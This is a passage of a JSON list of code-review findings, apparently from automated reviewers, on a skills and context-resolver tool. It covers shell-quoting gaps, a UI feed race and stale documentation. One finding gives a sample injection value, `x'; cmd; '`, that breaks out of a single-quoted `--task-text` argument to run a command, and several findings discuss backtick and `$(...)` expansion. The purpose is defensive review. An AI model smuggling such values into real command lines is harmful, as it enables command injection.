    "impact": "Trigger: a task description with an apostrophe, pasted by an agent that read only one of these skills. The quote closes early: the command fails with an unterminated string, the text is cut at the apostrophe so a keyword after it silently stops promoting, or, when a backtick or `$(...)` follows the apostrophe, the shell sees it outside quotes. The injection hazard the double-quote template had is closed only where the escape rule is stated. Frequency is moderate because the dispatcher is a model that may escape by habit.",
    "suggested_fix": "State the escape rule once in a place all five skills share, or repeat the same clause at each site: 'Single-quote the text; a `'` inside it becomes `'\\''`'. Better, add `--task-text-file <path>` so no skill has to explain quoting. Fix the flow-orchestrator placeholder so it contains no apostrophe (`<title and description of the task>`). Update the bundled and managed copies together; skill-sync.test.ts keeps them byte-identical.",
    "evidence": "Sites carrying the escape clause: flow-orchestrator/SKILL.md line 323 only. Sites with the single-quoted template and no clause: task-implementer/SKILL.md 2.0c, tests-creator/SKILL.md 1.2b, job-orchestrator/SKILL.md lines 749 and 1307, orchestrator-prompt.md lines 132 and 188, each present in .metaproject/skills/gdskills and src/gdskills/bundled/skills. Listed with a script that printed every `--task-text` occurrence in both trees.",
    "confidence": "medium",
    "reviewer": "review-clean-code",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "flow-orchestrator/SKILL.md:323 (has the escape clause)",
        "task-implementer/SKILL.md 2.0c (no clause)",
        "tests-creator/SKILL.md 1.2b (no clause)",
        "job-orchestrator/SKILL.md:749 and :1307 (no clause)",
        "job-orchestrator/orchestrator-prompt.md:132 and :188 (no clause)",
        "each of the above exists in both .metaproject/skills/gdskills and src/gdskills/bundled/skills"
      ],
      "enumeration_method": "a script walked both skill trees and printed every `--task-text` occurrence with its following text; the clause search was `single-quoted` in the same trees."
    }
  },
  {
    "id": "review-clean-code-w1:F-004",
    "severity": "minor",
    "file": "src/gdskills/reference-entries.ts",
    "line": null,
    "quote": "const before = WORD_CHAR.test(chars[0] ?? \"\") ? \"(?<![\\\\p{L}\\\\p{N}_])\" : \"\";",
    "problem": "The word-character class `[\\p{L}\\p{N}_]` is now spelled three times in six lines: the WORD_CHAR regex, the lookbehind string and the lookahead string. The boundary fix has to keep all three equal to be correct, and nothing links them (Clean Code E1, near-duplicate definitions that must change together).",
    "impact": "Maintenance cost only: someone who adds a character to the class in one place (a hyphen, say) changes the edge test but not the lookaround, or the reverse, and keywordOccurs then demands a boundary the edge test did not expect. No wrong behaviour today; the tests pin the current spelling.",
    "suggested_fix": "Define the class once, for example `const WORD = \"\\\\p{L}\\\\p{N}_\"; const WORD_CHAR = new RegExp(`^[${WORD}]$`, \"u\");` and build `(?<![${WORD}])` and `(?![${WORD}])` from it.",
    "evidence": "reference-entries.ts head lines 41, 51 and 52 each contain the class.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "single:review-clean-code-w1:F-004"
  },
  {
    "id": "review-clean-code-w1:F-005",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "    if (mine > applied && !sameStatus(current, next)) {\n      current = next;\n      for (const listener of [...listeners]) listener(next);\n    }\n    applied = Math.max(applied, mine);",
    "problem": "The ordering guard added for the overlapping-load race records the load as applied only after the listeners have run. The open finding clean-code-w5:F-003 (listeners share the load's error path) was not fixed, and it now has a second consequence: when a subscriber throws, `current` is already advanced but `applied` is not. A load that began earlier and finishes later then passes `mine > applied` and overwrites `current` with older data, which is the race the guard was added to stop.",
    "impact": "Trigger: a subscriber throws (for example a repaint against a destroyed renderable) while two loads overlap, e.g. a poll that started before the `e` toggle. Outcome: the throw is reported as a failed poll, and the older load then replaces the newer status in `current` and in the sidebar and modal. Self-heals on the next differing poll; needs a throwing subscriber, so rare.",
    "suggested_fix": "Advance the bookkeeping before notifying: `if (mine <= applied) return next; applied = mine; if (!sameStatus(current, next)) { current = next; notify(next) }`, and isolate each listener in its own try/catch that reports through options.onError (this also closes clean-code-w5:F-003).",
    "evidence": "project-context-inspector.ts head lines 172-182: `applied = Math.max(applied, mine)` is after the `for (const listener of [...listeners]) listener(next);` loop; a throw in the loop skips it. Reasoned from the code; not executed.",
    "confidence": "medium",
    "reviewer": "review-clean-code",
    "dedupe_key": "feed-applied-after-listeners"
  },
  {
    "id": "review-clean-code-w1:F-006",
    "severity": "info",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "  let started = 0;\n  let applied = 0;",
    "problem": "`started` and `applied` are sequence counters, but their names read as booleans next to `failing` and `polling`, and `mine` for the local ticket says nothing about what it is a ticket for (Clean Code A1).",
    "impact": "A reader has to open reload() to learn that `applied` is a number compared with `>`. No wrong behaviour.",
    "suggested_fix": "Rename to `loadsStarted` / `lastAppliedLoad` and `mine` to `loadNumber`, or add a one-line comment above the pair stating they are monotone load counters.",
    "evidence": "project-context-inspector.ts head lines 168-181.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "single:review-clean-code-w1:F-006"
  },
  {
    "id": "review-clean-code-w1:F-007",
    "severity": "info",
    "file": "src/gdskills/context-resolver.ts",
    "line": null,
    "quote": "Array.from(options.taskText!).length",
    "problem": "recordLastResolve tests `options.taskText !== undefined && options.taskText.trim() !== \"\"` on line 531 to compute `task`, then re-asserts the same fact two lines later with a non-null assertion on a line that also nests a conditional spread inside a conditional spread. The guard and the assertion can drift apart.",
    "impact": "Readability only; the length is correct today.",
    "suggested_fix": "Hoist the validated text: `const text = options.taskText?.trim() ? options.taskText : undefined;` then `task = text !== undefined ? truncateTaskText(text) : undefined` and use `Array.from(text).length`, or have truncateTaskText return the original length.",
    "evidence": "context-resolver.ts head lines 529-537.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "task-text-length-recompute"
  },
  {
    "id": "review-clean-code-w2:F-001",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "Stale documentation (Clean Code C1, a comment that no longer matches the code). This slice changes scanCitations in src/gdskills/references-check.ts so that a rule imported with --link is read at its origin (readProjectRuleRegistry, resolveOriginPath), and adds a test for it. The header comment in that file was updated ('A linked rule (registered in place, not copied) is scanned at its origin.'). Two doc sentences were left behind and now state the opposite: the guide quoted here and the `references check` row of docs/docs/cli-reference.md ('Citations are backticked `X.md` names in `.metaproject/rules/project/`; a linked rule is not scanned.').",
    "impact": "A reader who imports rules with --link believes a document cited only by a linked rule will be reported as unused-declaration or never checked, and may add or drop declarations to work around behaviour that no longer exists. The docs also disagree with the in-code comment and the new test.",
    "suggested_fix": "Change both sentences to say a linked rule is scanned at its origin and a bundled rule is not. In the guide: 'only: a rule imported with `--link` is scanned at its origin, and bundled rules are not.' In cli-reference.md drop '; a linked rule is not scanned' or replace it with 'a linked rule is scanned at its origin'.",
    "evidence": "src/gdskills/references-check.ts:16 reads 'A linked rule (registered in place, not copied) is scanned at its origin.'; docs/docs/guides/apply-project-rules.md:261 and docs/docs/cli-reference.md:3491 (the `references check` row) still say 'not scanned'. keryx ctx rg for 'not scanned' and 'linked rule' over these files lists exactly these two doc sites. Slice-02 diff hunk for references-check.ts shows the origin read; the new test in src/commands/skills-references.test.ts ('a rule imported with --link is scanned at its origin') asserts it.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "docs-linked-rule-not-scanned",
    "location_class": "in-diff"
  },
  {
    "id": "review-clean-code-w2:F-002",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.test.ts",
    "line": null,
    "quote": "const onDestroy = source.slice(source.indexOf(\"onDestroy: () => {\"), source.indexOf(\"onDestroy: () => {\") + 2500);",
    "problem": "The test that proves the shell stops the feed asserts on the text of tui-shell.ts instead of on behaviour. It cuts a fixed 2500-character window after the first 'onDestroy: () => {' and checks that the window contains 'stopProjectContextFeed?.()'. It also repeats the literal 'onDestroy: () => {' and its indexOf call twice, and it breaks silently if indexOf returns -1 (slice(-1, 2499) then reads from the file tail).",
    "impact": "The test fails when someone renames the variable, reformats the call, or grows the onDestroy body past 2500 characters while the stop call is still wired, and it passes if the first 'onDestroy: () => {' in the file belongs to another handler that happens to contain the call. A test that fails for reasons unrelated to the behaviour it names trains reviewers to loosen it.",
    "suggested_fix": "Extract the wiring into a small function exported from tui-shell.ts (or the inspector module) that takes the feed and returns the teardown, and test that it calls feed.stop(). If a source check must stay, locate the block with a named constant and assert indexOf >= 0 first, and take the block up to its closing brace instead of a fixed window.",
    "evidence": "src/tui/project-context-inspector.test.ts:598-600 (the slice, the contain check, and a second check on the assignment string). src/tui/tui-shell.ts:3936 declares stopProjectContextFeed, :4032 opens onDestroy, :4047 calls it, :5295 assigns it. Distance between :4032 and :4047 is 15 lines, so the 2500-character window is wide enough today and by an unstated margin.",
    "confidence": "medium",
    "reviewer": "review-clean-code",
    "dedupe_key": "source-text-feed-stop-test",
    "location_class": "in-diff"
  },
  {
    "id": "review-clean-code-w2:F-003",
    "severity": "info",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "--task-text \"Add a loading spinner to the Button\"",
    "problem": "Inconsistent vocabulary and guidance for one concept (Clean Code A3). This slice moves every instruction that passes --task-text to single quotes, and flow-orchestrator/SKILL.md explains why ('a `'` inside it becomes `'\\''`: double quotes let the shell run any backtick or `$(...)` a task description contains'). The worked example in the guide is the one remaining place that shows --task-text in double quotes, and the other skills and the README that switched to single quotes do not carry the escape rule.",
    "impact": "A reader who copies the guide example into a script and substitutes a task description containing a backtick or $(...) gets shell expansion, which is the hazard the rest of the slice fixes. The example text itself is harmless, so this is guidance drift, not a defect.",
    "suggested_fix": "Change the example to --task-text 'Add a loading spinner to the Button' and add one sentence beside it pointing at the single-quote rule and the '\\'' escape. The ellipsis in Step B of the skills is already tracked in review-clean-code-w2:F-002 of r02 and still applies unchanged; it is not re-filed.",
    "evidence": "keryx ctx rg for 'task-text \"' over README.md, docs/docs, .metaproject/skills and src/gdskills/bundled returns one match, docs/docs/guides/apply-project-rules.md:172. The diff of README.md, job-orchestrator, task-implementer and tests-creator SKILL.md shows the double-to-single quote change in each.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "task-text-escape-rule-missing",
    "location_class": "in-diff"
  },
  {
    "id": "review-clean-code-w3:F-001",
    "severity": "minor",
    "file": "src/gdskills/context-resolver.ts",
    "line": null,
    "quote": "taskTextLength: Array.from(options.taskText!).length",
    "problem": "recordLastResolve now needs the full (uncut) code-point length of the task text, but truncateTaskText returns only the cut text and a flag, so the length is recomputed with a second Array.from over the whole string (truncateTaskText already built that array) and a non-null assertion (`options.taskText!`) is used to get past the narrowing that `task !== undefined` implies but TypeScript cannot see. After this change `task.text` is unused here: `task` exists only to carry `.truncated`.",
    "impact": "Maintenance cost only. The `!` hides a coupling between two separate conditions (`options.taskText !== undefined` and `task !== undefined`); a later edit to the guard on line 531 can leave the assertion lying. The text is code-point-split twice per record. No wrong result today.",
    "suggested_fix": "Have truncateTaskText return the length it already computed: `{ text, truncated, length: chars.length }`, then write `taskTextLength: task.length` and drop the `!`. Callers of truncateTaskText (context-resolver.ts:464, 531) need no other change.",
    "evidence": "src/gdskills/context-resolver.ts:74-77 builds `const chars = Array.from(text)` and discards its length; :531 binds `const task = ... truncateTaskText(options.taskText) : undefined`; :535 re-runs `Array.from(options.taskText!).length`. Searched: `keryx ctx rg truncateTaskText src` gives two callers, both in this file.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "task-text-length-recompute",
    "location_class": "in-diff",
    "blocking_merge": false
  },
  {
    "id": "review-clean-code-w3:F-002",
    "severity": "minor",
    "file": "src/gdskills/context-resolver.test.ts",
    "line": null,
    "quote": "{ taskText: `${\"x\".repeat(TASK_TEXT_MAX_CHARS + 50)}` }",
    "problem": "The edit wrapped the argument in a template literal whose only content is one interpolation, which is `String(\"x\".repeat(...))` and changes nothing. The same test then asserts absence with a bare literal `\"xxxxxxxxxx\"` (ten x) whose link to the repeated text is implicit.",
    "impact": "Noise for the next reader of the test: the wrapper reads as if something were being concatenated. Minor; the assertion is correct.",
    "suggested_fix": "Use `{ taskText: \"x\".repeat(TASK_TEXT_MAX_CHARS + 50) }`, and name the probe (`const leakProbe = \"x\".repeat(10)`) or derive it from the same repeat so the not.toContain check visibly targets the recorded text.",
    "evidence": "src/gdskills/context-resolver.test.ts:432 (the wrapped argument) and :436 (`expect(await recordedFile()).not.toContain(\"xxxxxxxxxx\")`). The line before the change was `{ taskText: \"x\".repeat(TASK_TEXT_MAX_CHARS + 50) }` without the wrapper.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "template-literal-noop-test",
    "location_class": "in-diff",
    "blocking_merge": false
  },
  {
    "id": "review-highload-w1:F-001",
    "severity": "minor",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "--task-text '<task.description>'",
    "problem": "The fix for the double-quoted --task-text template swapped the quotes to single quotes in task-implementer 2.0c, tests-creator 1.2b, job-orchestrator SKILL.md (two places) and orchestrator-prompt.md (two places), but only flow-orchestrator/SKILL.md says that a `'` inside the text must be written `'\\''`. In the other four the placeholder is `'<task.description>'` with no escape rule. Before the swap an apostrophe in the text was harmless inside double quotes; now it ends the quoted argument.",
    "impact": "Trigger: a task title or description with an apostrophe (\"don't\", \"the task's file\", \"user's\"), which is ordinary English and far more common than a backtick. A worker that pastes the text into the single-quoted placeholder gets an unterminated quote (the command fails, no resolved file is written, so resolved_context_file is missing and the proof check has nothing to compare), or with a second apostrophe later in the text the span between them is parsed by the shell, so `$(...)` or a backtick there runs. The injection the swap was meant to stop is therefore only closed where the escape rule is stated. The four skills that omit it are the ones a worker or the job orchestrator follows without reading flow-orchestrator.",
    "suggested_fix": "Put the same sentence as in flow-orchestrator/SKILL.md next to each placeholder: \"write the text single-quoted; a `'` inside it becomes `'\\\\''`\", in task-implementer 2.0c, tests-creator 1.2b, job-orchestrator SKILL.md Step A and fix-loop item 3, and orchestrator-prompt.md steps 1 and FIX item 2, in both the bundled and the managed copies (skill-sync.test.ts requires them identical). A `--task-text-file` option would remove the class, but is a feature.",
    "evidence": "keryx ctx rg for task-text over src/gdskills/bundled and .metaproject/skills shows the single-quoted placeholder in all five skills (task-implementer/SKILL.md:182, tests-creator/SKILL.md:93, job-orchestrator/SKILL.md:749 and :1307, orchestrator-prompt.md:132 and :188). A fixed-string search for `'\\''` over the same bundled files matches only flow-orchestrator/SKILL.md.",
    "confidence": "medium",
    "reviewer": "review-highload",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (already states the escape)",
        "the same lines in the byte-identical copies under .metaproject/skills/gdskills"
      ],
      "enumeration_method": "keryx ctx rg 'task-text' over src/gdskills/bundled, .metaproject/skills, docs/docs and README.md, then a fixed-string search for the escape sequence over the bundled skill files."
    }
  },
  {
    "id": "review-highload-w1:F-002",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The guide still states the old limit of the citation scan: a rule imported with --link is not scanned. At head scanCitations reads linked rules at their origin (references-check.ts:97-109) and the file header says so.",
    "impact": "A reader (or the next reviewer) of docs/docs/guides/apply-project-rules.md is told that `references check` and `suggest` ignore linked rules, so a project that links its rules may add declarations by hand that suggest would have listed, or distrust an `unused-declaration` that is correct. The documented limit and the behaviour disagree.",
    "suggested_fix": "Rewrite the sentence: the scan covers copied rules and rules imported with --link (read where they live); bundled rules are not scanned. Mention that a linked file whose hash changed since the link is still scanned here although the resolver excludes it until `keryx skills update --rules`.",
    "evidence": "docs/docs/guides/apply-project-rules.md:259-262 versus src/gdskills/references-check.ts:16 and :97-109 at head. The doc line was not touched by the delta diff.",
    "confidence": "high",
    "reviewer": "review-highload",
    "dedupe_key": "docs-linked-rule-not-scanned"
  },
  {
    "id": "review-highload-w3:F-001",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "    applied = Math.max(applied, mine);\n    return next;",
    "problem": "reload() drops an older load from the feed but still returns that older `next` to its caller, and `applied` is only advanced after the subscriber loop. (a) A modal toggle calls loadStatus() = feed.reload() (mine=1); a poll starts after it (mine=2) and finishes first, so the feed holds the newer status. The toggle's reload then returns its own older `next`, and presentProjectContext does `status = next` with it. The feed never notifies again (current already equals the newer status and later polls compare equal), so the open modal keeps the older status until the status really changes again. (b) If a subscriber throws (sidebar repaint on a destroyed renderable, see clean-code-w5:F-003), `applied = Math.max(applied, mine)` is skipped, so a still-in-flight older load can later pass `mine > applied` and overwrite `current` with older data, which is the very overwrite the counter exists to stop.",
    "impact": "Stale modal contents after a concurrent poll and toggle, and a possible regression of the feed to older data after one failing subscriber. The window is a few milliseconds per race and TUI-local, so it is a UI-consistency defect, not a capacity one; it needs a status change landing between the two loads to be visible.",
    "suggested_fix": "Advance the counter before notifying and return what the feed holds: `const fresh = mine > applied; applied = Math.max(applied, mine); if (fresh && !sameStatus(current, next)) { current = next; for (const l of [...listeners]) { try { l(next); } catch { /* subscriber failures are not load failures */ } } } return fresh ? next : (current ?? next);`. Add a test that asserts the return value of the older reload and one with a throwing subscriber.",
    "evidence": "reload() at head: `const mine = ++started; const next = await options.load(); if (mine > applied && !sameStatus(current, next)) { current = next; for (const listener of [...listeners]) listener(next); } applied = Math.max(applied, mine); return next;`. The modal path is `.then(() => options.loadStatus()).then((next) => { status = next; options.onStatus?.(next); })` with loadStatus: reloadProjectContext = projectContextFeed.reload (tui-shell.ts). The R7 test 'an older load that finishes last cannot overwrite a newer status' asserts feed.current() only, never the value `older` resolves to.",
    "confidence": "medium",
    "reviewer": "review-highload",
    "dedupe_key": "feed-reload-returns-stale-status",
    "class_scope": {
      "sites": [
        "src/tui/project-context-inspector.ts: reload() return value and applied bookkeeping"
      ],
      "enumeration_method": "keryx ctx rg for createProjectContextFeed, projectContextFeed.reload and loadStatus: the only consumers of the returned status are showProjectContext (initial) and the modal toggle in presentProjectContext; the sidebar reads feed.current()."
    }
  },
  {
    "id": "review-highload-w3:F-002",
    "severity": "minor",
    "file": ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md",
    "line": null,
    "quote": "--task-text '<task title and description>'",
    "problem": "Partial close of r02 highload-w2:F-001. flow-orchestrator line 323 now says to write the text single-quoted and to turn an inner `'` into `'\\''`. The sibling instructions that carry the same command are single-quoted too but give no escape rule, so an orchestrator following them verbatim breaks on any task title or description containing an apostrophe (\"don't\", \"user's\"), and an issue body such as `x'; cmd; '` closes the quote and runs. Sites without the escape note: job-orchestrator SKILL.md (wave command and the fix re-resolve, `'<fix task description>'`), orchestrator-prompt.md (two lines), task-implementer SKILL.md 2.0c (`'<task.description>'`), each in both the .metaproject copy and the bundled copy.",
    "impact": "In a job with many parallel tasks every task whose text holds an apostrophe fails resolve-context with a shell parse error. The resolved file is then missing; under `gdskills.projectContext.enforcement: block` the dispatch is refused for that task, under `warn` promotion is silently off for it. Task text comes from issue bodies, so the unescaped form is also an injection path (the security reviewer owns that).",
    "suggested_fix": "Put the same sentence next to every `--task-text '<...>'` occurrence, or better pass the text through a file or stdin (`--task-text-file`) so no quoting rule is needed. Minimum: copy 'Write the text single-quoted (a `'` inside it becomes `'\\''`)' into job-orchestrator SKILL.md (both sites), orchestrator-prompt.md (both sites) and task-implementer SKILL.md 2.0c, in .metaproject/skills and src/gdskills/bundled/skills.",
    "evidence": "keryx ctx rg -F \"'\\\\''\" over src/gdskills/bundled/skills and .metaproject/skills/gdskills/orchestration returns only flow-orchestrator/SKILL.md:323 (both copies). keryx ctx rg task-text lists 13 matches: job-orchestrator SKILL.md:749 and :1307, orchestrator-prompt.md:132 and :188, task-implementer SKILL.md:182, tests-creator SKILL.md:93, flow-orchestrator SKILL.md:323, each mirrored; only :323 carries the escape rule.",
    "confidence": "high",
    "reviewer": "review-highload",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93 (task-text mention, quoting not verified)",
        "flow-orchestrator/SKILL.md:323 in both trees (already correct)"
      ],
      "enumeration_method": "keryx ctx rg -n --all task-text over src/gdskills/bundled/skills/orchestration, src/gdskills/bundled/skills/quality and .metaproject/skills/gdskills/orchestration (13 matches, complete), cross-checked with a fixed-string search for the '\\'' escape (2 matches, both flow-orchestrator)."
    }
  },
  {
    "id": "review-logic-w1:F-001",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "applied = Math.max(applied, mine);",
    "problem": "In createProjectContextFeed.reload the `applied` watermark is advanced after the listener loop. If a subscriber throws (the loop has no isolation, still open as review-clean-code-w5:F-003), reload rejects before `applied` is raised, although `current` already holds the newer status. The ordering guard `mine > applied` then no longer protects against an older load.",
    "impact": "Trigger: load B (started second) finishes first, a listener throws (for example a sidebar repaint against a renderable that is gone). `current` = B, `applied` stays at its old value. Load A (started first, read older data) now finishes: `mine(A) > applied` is true, so the feed replaces the newer status with the older one and notifies listeners with it. Outcome: the sidebar and the open modal show stale enforcement or reference data until the next change, which is the race the guard was added to remove. Needs a throwing subscriber, so minor.",
    "suggested_fix": "Advance the watermark before notifying: set `applied = Math.max(applied, mine)` (and `current = next`) first, then run the listeners, each in its own try/catch that reports through options.onError. That also closes review-clean-code-w5:F-003.",
    "evidence": "src/tui/project-context-inspector.ts reload(): `const mine = ++started; const next = await options.load(); if (mine > applied && !sameStatus(current, next)) { current = next; for (const listener of [...listeners]) listener(next); } applied = Math.max(applied, mine);`. A throw inside the for loop skips the last statement.",
    "confidence": "medium",
    "reviewer": "review-logic",
    "dedupe_key": "feed-applied-after-listeners",
    "location_class": "in-diff"
  },
  {
    "id": "review-logic-w1:F-002",
    "severity": "minor",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": "text = await readFile(origin === undefined ? path.join(projectRoot, rulePath) : resolveOriginPath(origin, projectRoot), \"utf8\");",
    "problem": "scanCitations now reads a linked rule at its origin, but it does not apply the resolver's two checks on a link. collectProjectRules excludes a link whose file changed since it was linked (sha256 differs from the registry entry) and warns; scanCitations reads and scans it anyway. For an unreadable link it reports `.metaproject/rules/project/<ref>` as unreadable, a path that does not exist for a link, instead of the origin path.",
    "impact": "Trigger: a rule linked with `skills import --rules --link` whose origin file was edited afterwards and now cites STYLING.md (or stopped citing it). `resolve-context` warns 'changed since it was linked; the rule is excluded' and ignores its citations, while `references suggest` and the import hint count them and `references check` does not report `unused-declaration` for a declaration only that rule cites. The check and the engine again disagree about which documents are cited, for a changed link only. Small, since the resolver also tells the operator to re-run `skills update --rules`.",
    "suggested_fix": "Compare sha256Hex(text) with the registry entry's sha256 and treat a mismatch as unreadable (the resolver's behaviour), and name the origin path in unreadableRules for a link. Better, factor the link-reading part of collectProjectRules into one helper both call.",
    "evidence": "src/gdskills/context-resolver.ts:217-227 (readText(origin), `sha256Hex(text) !== entry.sha256` -> excluded with a warning) versus src/gdskills/references-check.ts:99-109 (links map keeps only `entry.origin`; no hash comparison; unreadable path built from PROJECT_RULES_DIR/ref).",
    "confidence": "medium",
    "reviewer": "review-logic",
    "dedupe_key": "scancitations-linked-rule-parity",
    "location_class": "in-diff"
  },
  {
    "id": "review-logic-w2:F-001",
    "severity": "info",
    "file": ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "carries an `anchor`, a `description` and `section_bytes`",
    "problem": "The instruction says every entry promoted by a condition carries an anchor and section_bytes and that the worker's item needs the anchor exactly as declared. In the resolver the anchor is optional: reference-entries.ts emits `anchor` and `section_bytes` only when the declaration has an anchor, and proofFailures in reference-proof.ts demands an anchor only `if (entry.anchor !== undefined ...)`. The flow-orchestrator constraint ('an entry promoted by a condition also needs its anchor and a summary') and the same sentence in the bundled and job-orchestrator copies repeat the unconditional wording.",
    "impact": "No observable defect: a worker that finds no anchor on a promoted entry has nothing to copy and the validator does not ask for one. The wording could push a worker to invent an anchor for an anchorless declaration, which the validator does not forbid but which is noise.",
    "suggested_fix": "Say 'carries, when the declaration has one, an `anchor` and `section_bytes`' in task-implementer SKILL.md (all three copies) and 'also needs its anchor (when the entry has one) and a summary' in flow-orchestrator SKILL.md (all copies), keeping the copies in sync.",
    "evidence": "reference-entries.ts: `...(declaration.anchor !== undefined ? { anchor: declaration.anchor } : {})`; reference-proof.ts proofFailures: `if (entry.anchor !== undefined && item.anchor !== entry.anchor)`; task-implementer SKILL.md line 184 and flow-orchestrator SKILL.md line 346 at head.",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w2:F-001"
  },
  {
    "id": "review-logic-w2:F-002",
    "severity": "info",
    "file": "src/gdskills/reference-proof.ts",
    "line": null,
    "quote": "if (entry.anchor !== undefined && item.anchor !== entry.anchor) {",
    "problem": "The anchor in the proof item is compared with the declared anchor by raw string equality, while the summary words are NFC-normalised (distinctWords) and the schema adds the anchor as a free string. An anchor containing a non-ASCII character (for example an accented or Cyrillic heading) that the worker re-types or copies through a tool that decomposes it (NFD) differs in code points from the declared one although it reads identically. The loader trims the anchor but does not normalise it either.",
    "impact": "A worker that cites the right section is reported as 'cites anchor X; the declaration says X' with two visually identical strings, and the only way out is to retry. Unlikely in practice (workers copy the anchor from the resolver output) and the failure is loud, not silent.",
    "suggested_fix": "Compare `item.anchor.normalize(\"NFC\").trim()` with `entry.anchor.normalize(\"NFC\")`, or normalise the anchor once in references-config.ts when it is loaded.",
    "evidence": "reference-proof.ts line 93 compares with `!==`; distinctWords at line 41 calls `text.normalize(\"NFC\")`; references-config.ts trims the anchor without normalising.",
    "confidence": "low",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w2:F-002"
  },
  {
    "id": "review-logic-w3:F-001",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The guide says the citation scan skips a rule imported with --link, and docs/docs/cli-reference.md (references check row) says the same: 'a linked rule is not scanned'. At head the scan does read linked rules: scanCitations in src/gdskills/references-check.ts builds a map of registry entries with mode 'link' and reads them at their origin (comment: 'A linked rule (registered in place, not copied) is scanned at its origin.'). This is the r02 finding review-logic-w2:F-001, fixed in code, but the two doc sentences written for the old behaviour were not updated.",
    "impact": "A user who links a rules folder is told its citations are ignored, so undeclared-citation warnings raised for linked rules look like a bug, and the user may wrongly conclude a declaration cited only by a linked rule will be reported as unused.",
    "suggested_fix": "Replace the sentence with 'a rule imported with --link is scanned at its origin; bundled rules are not scanned', and drop 'a linked rule is not scanned' from the references check row of cli-reference.md.",
    "evidence": "src/gdskills/references-check.ts:16 and :98-105 versus docs/docs/guides/apply-project-rules.md:260-262 and docs/docs/cli-reference.md:3491.",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "docs-linked-rule-not-scanned"
  },
  {
    "id": "review-logic-w3:F-002",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "The byte count of a promoted document is the size of its section, or of the",
    "problem": "The statement is wrong for the printed count. In reference-entries.ts the entry's bytes is Buffer.byteLength of the whole file; only section_bytes and promotedBytes (the budget term) use the section. The example 20 lines above shows it: 'STYLING.md ... 438 bytes ... (anchor \"Class conventions\", section 349 bytes)', and Budget 462 = 113 + 349.",
    "impact": "A reader comparing the printed 'N bytes' with the section size, or summing the listed bytes against the Budget line, finds the numbers do not agree with the stated rule.",
    "suggested_fix": "Say 'The budget counts a promoted document by the size of its section (section N bytes in the entry), or the whole file when there is no anchor; the bytes printed first is always the file size.'",
    "evidence": "src/gdskills/reference-entries.ts:118 and :124 (bytes) versus :129 (section_bytes).",
    "confidence": "high",
    "reviewer": "review-logic",
    "dedupe_key": "single:review-logic-w3:F-002"
  },
  {
    "id": "review-logic-w3:F-003",
    "severity": "info",
    "file": "src/commands/skills-references.ts",
    "line": null,
    "quote": "console.log(args.includes(\"--json\") ? JSON.stringify(report, null, 2) : renderReferencesReport(report));",
    "problem": "Only --json is read, from anywhere in args. A mistyped flag (check --jsn) or an unsupported one (suggest --json) is silently ignored and text or JSON of the default shape is printed.",
    "impact": "A script that passes --json to suggest, or misspells it on check, gets output of a different shape than it asked for, with exit 0.",
    "suggested_fix": "Reject arguments after the action other than --json for check, and none for suggest, with the USAGE message and exit 1.",
    "evidence": "src/commands/skills-references.ts:47-63.",
    "confidence": "medium",
